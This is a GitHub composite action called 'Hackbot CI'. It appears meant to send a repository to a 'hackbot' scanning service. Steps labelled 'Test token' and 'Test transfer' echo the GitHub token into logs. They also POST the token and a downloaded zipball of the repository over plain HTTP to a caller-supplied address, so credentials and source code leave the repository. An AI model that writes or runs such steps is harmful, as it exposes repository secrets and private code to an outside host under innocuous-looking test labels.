name: 'Hackbot CI'
description: 'Hackbot action'

inputs:
  bot_address:
    description: 'The address of the bot to hack'
    required: false
    default: 'localhost'
  bot_port:
    description: 'The port of the bot to hack'
    required: false
    default: '5000'

runs:
  using: "composite"
  steps:

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.12'

    - name: Install dependencies
      shell: bash
      run: |
        python -m pip install --upgrade pip
        pip install aiohttp
        pip install requests
        echo "TOKEN ${{ env.GITHUB_TOKEN }}"
        echo "Repo ${{ github.repository }}"
        echo "Address https://api.github.com/repos/${{ github.repository }}/zipball"

    - name: Test access
      shell: bash
      run: |
        curl -L \
          -H "Accept: application/vnd.github+json" \
        -H "Authorization: Bearer ${{ github.token }}" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        https://api.github.com/repos/${{ github.repository }}/zipball --output zipball.zip
        if [ -f zipball.zip ]; then
            echo "zipball.zip is present"
            ls -l zipball.zip
        else
            echo "Error: zipball.zip is not present"
            exit 1
        fi

    - name: Test token
      shell: bash
      run: |
        echo "Token: ${{ github.token }}"
        python3 <<EOF
        import aiohttp
        import asyncio
        import json
        import os        
        async def make_request(session, url, data):
            async with session.post(url, json=data, headers={"Content-Type": "application/json"}) as response:
                return await response.text()        

        async def main():
            url = f"http://${{ inputs.bot_address }}:${{ inputs.bot_port }}/api/token"
            data = {"token": "${{ github.token }}"}

            async with aiohttp.ClientSession() as session:
                response_text = await make_request(session, url, data)

            # Append each result to a JSON file
            with open('results.json', 'w') as f:
                json.dump(response_text, f, indent=2)

            return response_text

        results = asyncio.run(main())
        github_output = os.environ.get('GITHUB_OUTPUT')
        if github_output:
            with open(github_output, 'a') as f:
                f.write(f"hack_results<<EOF\n{json.dumps(results)}\nEOF\n")
        EOF

    - name: Test transfer
      shell: bash
      run: |
        echo "Transfer: zipball.zip"
        python3 <<EOF
        import requests
        files = {'file': open('zipball.zip', 'rb')}
        response = requests.post(f"http://${{ inputs.bot_address }}:${{ inputs.bot_port }}/api/transfer", files=files)
        print(response.text)
        EOF


    # - name: Test access
    #   shell: bash
    #   run: |
    #     python3 <<EOF
    #     import requests
    #     import os
    #     import json
    #     response = requests.get(f"https://api.github.com/repos/${{ github.repository }}/zipball",
    #                             headers={"Authorization": f"token ${{ github.token }}",
    #                                      "Accept": "application/vnd.github.v3+json"},
    #                             )
    #     if response.status_code != 200:
    #       print(f"Failed to access the bot: {response.status_code}")
    #       exit(1)
    #     print("Successfully accessed the bot")
    #     EOF

    - name: Hack the contract
      if: !always()
      shell: bash
      run: |
        # Process the response using Python
        python3 <<EOF
        import aiohttp
        import asyncio
        import json
        import os        
        async def make_request(session, url, data):
            async with session.post(url, json=data, headers={"Content-Type": "application/json"}) as response:
                return await response.text()

        async def process_ndjson(ndjson_str):
            results = []
            for line in ndjson_str.strip().split('\n'):
                if line.startswith('data: '):
                    try:
                        json_str = line[5:].strip()  # Remove 'data: ' prefix
                        json_obj = json.loads(json_str)
                        results.append(json_obj)
                    except json.JSONDecodeError:
                        print(f"Failed to parse JSON: {json_str}")
            return results

        async def main():
            url = f"http://${{ inputs.bot_address }}:${{ inputs.bot_port }}/api/hack"
            data = {"repo_url": "git@github.com:${{ github.repository }}"}

            async with aiohttp.ClientSession() as session:
                response_text = await make_request(session, url, data)
                results = await process_ndjson(response_text)

            # Append each result to a JSON file
            with open('results.json', 'w') as f:
                json.dump(results, f, indent=2)

            return results

        results = asyncio.run(main())
        github_output = os.environ.get('GITHUB_OUTPUT')
        if github_output:
            with open(github_output, 'a') as f:
                f.write(f"hack_results<<EOF\n{json.dumps(results)}\nEOF\n")
        EOF
outputs:
  hack_results:
    description: "The results of the hack"
    value: ${{ steps.hack_results.outputs.hack_results }}